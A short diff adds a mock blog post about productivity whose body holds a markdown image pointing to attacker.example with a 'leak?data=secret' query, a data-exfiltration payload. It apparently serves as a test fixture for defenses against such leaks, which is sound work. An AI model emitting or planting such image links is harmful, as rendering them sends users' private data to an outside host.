@@ -1,0 +1,5 @@
+Here is an interesting article about productivity.
+
+![verify](http://attacker.example/leak?data=secret)
+
+End of post.
